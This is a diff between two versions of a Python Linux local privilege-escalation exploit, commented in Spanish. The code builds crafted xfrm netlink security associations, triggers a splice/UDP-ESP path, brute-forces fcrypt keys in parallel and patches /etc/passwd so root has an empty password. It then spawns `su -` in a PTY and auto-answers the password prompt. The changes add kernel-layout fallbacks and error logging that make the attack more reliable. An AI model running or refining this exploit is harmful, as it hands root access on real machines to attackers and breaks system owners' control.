@@ -7,14 +7,17 @@ Tres partes:
   2) rxrpc_lpe_main: parchea /etc/passwd (root::0:0) vía rxrpc/rxkad.
   3) main          : orquesta ambos caminos, abre PTY y exec'ea `su -`.
 
-Correcciones v3:
-  - _build_xfrm_usersa_info: struct xfrm_selector MODERNO de 56 bytes
-    (incluye campo 'user'), xfrm_usersa_info 220 bytes. Para kernels
-    antiguos (< ~4.19, sin 'user') exportar XFRM_SELECTOR_OLD=1.
-  - rxrpc_lpe_main: mmap usa min(4096, st.st_size) para evitar ValueError
-    cuando el archivo mide < 4096 bytes.
-  - K_C se busca en paralelo (multiprocessing) porque fc_check_pc es
-    ~500x más estricta que K_A/K_B. K_A y K_B siguen siendo offline.
+Correcciones v4:
+  - fcrypt_user_decrypt: REVERTIDO al algoritmo original (v3 introdujo
+    una "optimización" rota que hacía fallar el selftest).
+  - _build_xfrm_usersa_info(spi, seqhi, modern): recibe el flag
+    'modern' explícitamente. modern=True -> selector 56B, info 220B.
+    modern=False -> selector 52B, info 216B.
+  - add_xfrm_sa: prueba primero 220B (modern) y si el kernel lo
+    rechaza, reintenta con 216B (legacy). Además imprime el errno real
+    del kernel en el log de verbose para diagnosticar.
+  - rxrpc_lpe_main: mmap con min(4096, st.st_size).
+  - K_C: búsqueda paralela con multiprocessing + progreso cada 5s.
 """
 
 import os, sys, ctypes, struct, socket, time, errno, fcntl, select
@@ -193,20 +196,10 @@ XFRM_STATE_ESN          = 0x80
 def _inet_addr(ip):
     return struct.unpack("=I", socket.inet_aton(ip))[0]
 
-# --- V3: selector moderno (56 bytes) por defecto -------------------
-# xfrm_selector MODERNO (>=~4.19, con campo 'user'):
-#   daddr(16) saddr(16) dport(2) dport_mask(2) sport(2) sport_mask(2)
-#   family(2) prefixlen_d(1) prefixlen_s(1) proto(1) pad(3)
-#   ifindex(4) user(4)  --> 56 bytes
-# xfrm_usersa_info = 56 + 24 + 16 + 64 + 32 + 12 + 16 = 220
-#
-# xfrm_selector ANTIGUO (52 bytes, sin 'user'):
-# exportar XFRM_SELECTOR_OLD=1 --> info mide 216
-# -------------------------------------------------------------------
-XFRM_SELECTOR_MODERN = os.environ.get("XFRM_SELECTOR_OLD") != "1"
-
-def _build_xfrm_usersa_info(spi, patch_seqhi):
-    if XFRM_SELECTOR_MODERN:
+def _build_xfrm_usersa_info(spi, patch_seqhi, modern=True):
+    """modern=True  -> selector 56B, xfrm_usersa_info 220B (kernel >=~4.19)
+       modern=False -> selector 52B, xfrm_usersa_info 216B (kernel antiguo)"""
+    if modern:
         sel = (struct.pack("=I12x", _inet_addr("127.0.0.1")) +
                struct.pack("=I12x", _inet_addr("127.0.0.1")) +
                struct.pack("=HHHHHBBB3xII",
@@ -222,7 +215,7 @@ def _build_xfrm_usersa_info(spi, patch_seqhi):
                struct.pack("=HHHHHBBB3xI",
                            0, 0, 0, 0,
                            socket.AF_INET, 32, 32, 0,
-                           0))  # ifindex
+                           0))
         assert len(sel) == 52, len(sel)
         expected_info = 216
 
@@ -250,14 +243,20 @@ def _put_attr(nlh, typ, data):
     pad = b"\x00" * (RTA_ALIGN(rta_len) - rta_len)
     nlh.extend(hdr + data + pad)
 
-def add_xfrm_sa(spi, patch_seqhi):
+def _add_xfrm_sa_once(spi, patch_seqhi, modern):
+    """Devuelve (rc, err_string)."""
     try:
         sk = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 6)
-    except OSError:
-        return -1
+    except OSError as e:
+        return -1, "netlink socket: %s" % e
     try:
-        sk.bind((0, 0))
-        info = _build_xfrm_usersa_info(spi, patch_seqhi)
+        try:
+            sk.bind((0, 0))
+        except OSError as e:
+            return -1, "bind: %s" % e
+        sk.settimeout(2.0)
+
+        info = _build_xfrm_usersa_info(spi, patch_seqhi, modern=modern)
 
         hdr = bytearray(struct.pack("=IHHII",
                                     NLMSG_LENGTH(len(info)),
@@ -280,32 +279,62 @@ def add_xfrm_sa(spi, patch_seqhi):
 
         enc = struct.pack("=HHH", UDP_ENCAP_ESPINUDP,
                           socket.htons(ENC_PORT),
-                          socket.htons(ENC_PORT)) + b"\x00" * 16
-        enc += b"\x00" * 2
+                          socket.htons(ENC_PORT)) + b"\x00" * 16 + b"\x00" * 2
         _put_attr(nlh, XFRMA_ENCAP, enc)
 
         esn = struct.pack("=IIIIII",
                           1, 0, REPLAY_SEQ, 0,
                           patch_seqhi & 0xFFFFFFFF,
-                          32)
-        esn += struct.pack("=I", 0)
+                          32) + struct.pack("=I", 0)
         _put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn)
 
         struct.pack_into("=I", nlh, 0, len(nlh))
 
-        sk.send(bytes(nlh))
-        rbuf = sk.recv(4096)
-        if len(rbuf) >= 4:
-            nlmsg_type = struct.unpack_from("=H", rbuf, 4)[0]
-            if nlmsg_type == 2:
-                err = struct.unpack_from("=i", rbuf, 16)[0]
-                if err != 0:
-                    return -1
-        return 0
-    except OSError:
-        return -1
+        try:
+            sk.send(bytes(nlh))
+        except OSError as e:
+            return -1, "send: %s" % e
+
+        try:
+            rbuf = sk.recv(4096)
+        except socket.timeout:
+            return -1, "recv timeout (no ACK)"
+        except OSError as e:
+            return -1, "recv: %s" % e
+
+        if len(rbuf) < 20:
+            return -1, "short response (%d bytes): %s" % (len(rbuf), rbuf.hex())
+
+        nlmsg_type = struct.unpack_from("=H", rbuf, 4)[0]
+        if nlmsg_type == 2:  # NLMSG_ERROR
+            err = struct.unpack_from("=i", rbuf, 16)[0]
+            if err != 0:
+                errno_val = -err
+                return -1, "kernel errno=%d (%s)" % (
+                    errno_val, os.strerror(errno_val))
+        return 0, None
+    except Exception as e:
+        return -1, "exception: %s" % e
     finally:
-        sk.close()
+        try: sk.close()
+        except Exception: pass
+
+def add_xfrm_sa(spi, patch_seqhi):
+    # Intento 1: modern (220B)
+    rc, err = _add_xfrm_sa_once(spi, patch_seqhi, modern=True)
+    if rc == 0:
+        return 0
+    if g_su_verbose:
+        SLOG("add_xfrm_sa: modern(220B) failed: %s", err)
+    # Intento 2: legacy (216B)
+    rc2, err2 = _add_xfrm_sa_once(spi, patch_seqhi, modern=False)
+    if rc2 == 0:
+        if g_su_verbose:
+            SLOG("add_xfrm_sa: legacy(216B) succeeded")
+        return 0
+    if g_su_verbose:
+        SLOG("add_xfrm_sa: legacy(216B) failed: %s", err2)
+    return -1
 
 # ===================================================================
 #  SPLICE + UDP-ESP trigger
@@ -425,7 +454,7 @@ def su_lpe_main(argv):
     return 0
 
 # ===================================================================
-#  FCRYPT (kernel port)
+#  FCRYPT (kernel port) — V4: decrypt REVERTIDO al original
 # ===================================================================
 fc_sbox0_raw = bytes([
     0xea,0x7f,0xb2,0x64,0x9d,0xb0,0xd9,0x11,0xcd,0x86,0x86,0x91,0x0a,0xb2,0x93,0x06,
@@ -532,18 +561,29 @@ def fcrypt_user_setkey(key: bytes):
 
 def _FC_F(R, L, sched_entry):
     u = (sched_entry ^ R) & 0xFFFFFFFF
-    return (L ^ fc_sbox0[u & 0xff]
-              ^ fc_sbox1[(u >> 8) & 0xff]
-              ^ fc_sbox2[(u >> 16) & 0xff]
-              ^ fc_sbox3[(u >> 24) & 0xff])
+    c0 = u & 0xff
+    c1 = (u >> 8) & 0xff
+    c2 = (u >> 16) & 0xff
+    c3 = (u >> 24) & 0xff
+    return L ^ fc_sbox0[c0] ^ fc_sbox1[c1] ^ fc_sbox2[c2] ^ fc_sbox3[c3]
+
+# -------------------------------------------------------------------
+#  V4: fcrypt_user_decrypt CORRECTO (idéntico al v1 que pasaba el
+#  selftest). No "optimizar" - el bucle alterna qué registro se
+#  actualiza y usa _FC_F con argumentos intercambiados.
+# -------------------------------------------------------------------
+_FC_ORDER = [0xf, 0xe, 0xd, 0xc, 0xb, 0xa, 0x9, 0x8,
+             0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0]
 
 def fcrypt_user_decrypt(sched, ct: bytes) -> bytes:
     L = struct.unpack("=I", ct[0:4])[0]
     R = struct.unpack("=I", ct[4:8])[0]
-    for sc in (0xf, 0xe, 0xd, 0xc, 0xb, 0xa, 0x9, 0x8,
-               0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0):
-        L, R = R, _FC_F(L, R, sched[sc])
-    return struct.pack("=II", L, R)
+    for idx, sc in enumerate(_FC_ORDER):
+        if idx % 2 == 0:
+            R = _FC_F(L, R, sched[sc])
+        else:
+            L = _FC_F(R, L, sched[sc])
+    return struct.pack("=I", L) + struct.pack("=I", R)
 
 # ===================================================================
 #  AF_ALG pcbc(fcrypt)
@@ -885,7 +925,7 @@ def find_K_offline(ct: bytes, max_iters, check_fn, seed_init, label):
                              (label, dt, it, it / dt / 1e6 if dt > 0 else 0))
     return None, None
 
-# --- V3: búsqueda paralela para K_C -------------------------------
+# --- v4: K_C paralela ---------------------------------------------
 def _kc_worker(ct, check_fn, seed, q, stop, counter, batch=5000):
     while not stop.is_set():
         for _ in range(batch):
@@ -905,8 +945,8 @@ def _kc_worker(ct, check_fn, seed, q, stop, counter, batch=5000):
 def find_K_parallel(ct, check_fn, seed_init, label, nproc=None):
     if nproc is None:
         nproc = max(1, cpu_count())
-    sys.stderr.write("[*] %s: lanzando %d workers (predicado estricto, "
-                     "~18M iters esperadas)\n" % (label, nproc))
+    sys.stderr.write("[*] %s: %d workers (predicado estricto, ~18M iters "
+                     "esperadas)\n" % (label, nproc))
     sys.stderr.flush()
 
     q = Queue()
@@ -1033,7 +1073,6 @@ def rxrpc_lpe_main(argv):
             sys.stderr.write("[!] target too small: %d\n" % st.st_size)
             return 1
 
-        # V3: mmap no puede pedir más que el tamaño real del archivo
         mp = mmap.mmap(rfd_ro, min(4096, st.st_size),
                        access=mmap.ACCESS_READ)
 
@@ -1164,7 +1203,6 @@ def _run_su_pty():
     auto_verify = os.environ.get("LPE_AUTO_VERIFY") == "1"
     verify_sent = False
     total_ms = 0
-    buf = bytearray()
 
     try:
         while True:
@@ -1184,7 +1222,6 @@ def _run_su_pty():
                     break
                 if not chunk: break
                 os.write(1, chunk)
-                buf.extend(chunk)
                 if not auto_pw_sent and b"assword" in chunk:
                     os.write(master, b"\n")
                     auto_pw_sent = True
